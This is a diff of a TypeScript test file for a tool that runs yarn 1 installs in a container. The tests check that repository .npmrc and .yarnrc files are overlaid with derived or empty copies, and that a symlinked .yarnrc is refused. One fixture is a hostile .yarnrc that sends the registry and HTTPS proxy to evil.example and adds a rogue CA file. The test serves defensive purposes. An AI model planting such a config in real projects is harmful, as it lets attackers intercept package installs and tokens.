@@ -242,18 +242,45 @@ describe("the happy path, in order", () => {
     expect(packageCacheEnvironment(root)).toEqual({});
   });
 
-  it("yarn 1 gets its rc (scopes and the one token line) and the repository's rc is not read", async () => {
+  it("yarn 1 gets its rc (scopes and the one token line), and reads the npm userconfig: no repository rc is mounted when the repository has none", async () => {
     const { root } = await workspace({ "yarn.lock": "# yarn lockfile v1\n\n\"@acme/x@^1\":\n  resolved \"https://npm.pkg.github.com/download/@acme/x/1.0.0/abc\"\n" });
     let yarnrc = "";
     const h = await harness(root, { async onRun(context) { yarnrc = await readFile(join(context.secretsDirectory, "yarnrc"), "utf8"); return ok; } });
     const result = await h.run();
     expect(result.privateInstall?.[0]).toMatchObject({ manager: "yarn1", outcome: "installed" });
     const args = h.runs[0]!.args;
-    expect(args).toContain("--no-default-rc");
+    expect(args).not.toContain("--no-default-rc");
     expect(args).toContain("--use-yarnrc");
     expect(args.join(" ")).toContain("/usr/local/bin/yarn install --frozen-lockfile --ignore-scripts");
     expect(yarnrc).toMatch(/^"@acme:registry" "https:\/\/npm\.pkg\.github\.com\/"\n"\/\/npm\.pkg\.github\.com\/:_authToken" "ghp_/u);
-    expect(args.some((value) => value.endsWith("/.npmrc:ro"))).toBe(false);
+    expect(args.some((value) => value.endsWith("/.npmrc:ro") || value.endsWith("/.yarnrc:ro"))).toBe(false);
+  });
+
+  it("yarn 1 with an .npmrc and a .yarnrc of the repository: a DERIVED .npmrc and an EMPTY .yarnrc are mounted over them, inside the container only; the host files are untouched", async () => {
+    const npmrc = "@acme:registry=https://npm.pkg.github.com/\n//npm.pkg.github.com/:_authToken=${NPM_TOKEN}\n";
+    const yarnrc = "registry \"https://evil.example/\"\nhttps-proxy \"http://evil.example:3128\"\ncafile \"./evil-ca.pem\"\n";
+    const { root, repo } = await workspace({ "yarn.lock": "# yarn lockfile v1\n\n\"@acme/x@^1\":\n  resolved \"https://npm.pkg.github.com/download/@acme/x/1.0.0/abc\"\n", ".npmrc": npmrc, ".yarnrc": yarnrc });
+    let files: string[] = [];
+    let blank = "unset";
+    const h = await harness(root, { async onRun(context) { files = (await readdir(context.secretsDirectory)).sort(); blank = await readFile(join(context.secretsDirectory, "empty"), "utf8"); return ok; } });
+    const result = await h.run();
+    expect(result.privateInstall?.[0]).toMatchObject({ manager: "yarn1", outcome: "installed" });
+    const secrets = h.runs[0]!.secretsDirectory;
+    const mounts = h.runs[0]!.args.filter((value) => value.endsWith(":ro") && value.includes(secrets));
+    expect(mounts).toContain(`${join(secrets, files.find((name) => name.endsWith(".npmrc"))!)}:${join(repo, ".npmrc")}:ro`);
+    expect(mounts).toContain(`${join(secrets, "empty")}:${join(repo, ".yarnrc")}:ro`);
+    expect(blank).toBe("");
+    expect(await readFile(join(repo, ".npmrc"), "utf8")).toBe(npmrc);
+    expect(await readFile(join(repo, ".yarnrc"), "utf8")).toBe(yarnrc);
+  });
+
+  it("a .yarnrc that is not a regular file refuses a yarn 1 repository (its rc cannot be covered), without running anything", async () => {
+    const { root, repo } = await workspace({ "yarn.lock": "# yarn lockfile v1\n\n\"@acme/x@^1\":\n  resolved \"https://npm.pkg.github.com/download/@acme/x/1.0.0/abc\"\n", "real-yarnrc": "x\n" });
+    await symlink(join(repo, "real-yarnrc"), join(repo, ".yarnrc"));
+    const h = await harness(root, {});
+    const result = await h.run();
+    expect(result.privateInstall?.[0]).toMatchObject({ manager: "yarn1", outcome: "refused_npmrc_key" });
+    expect(h.runs).toHaveLength(0);
   });
 
   it("a repository .npmrc with a ${NPM_TOKEN} auth line gets a DERIVED copy mounted over it, inside the container only; the host file is untouched", async () => {
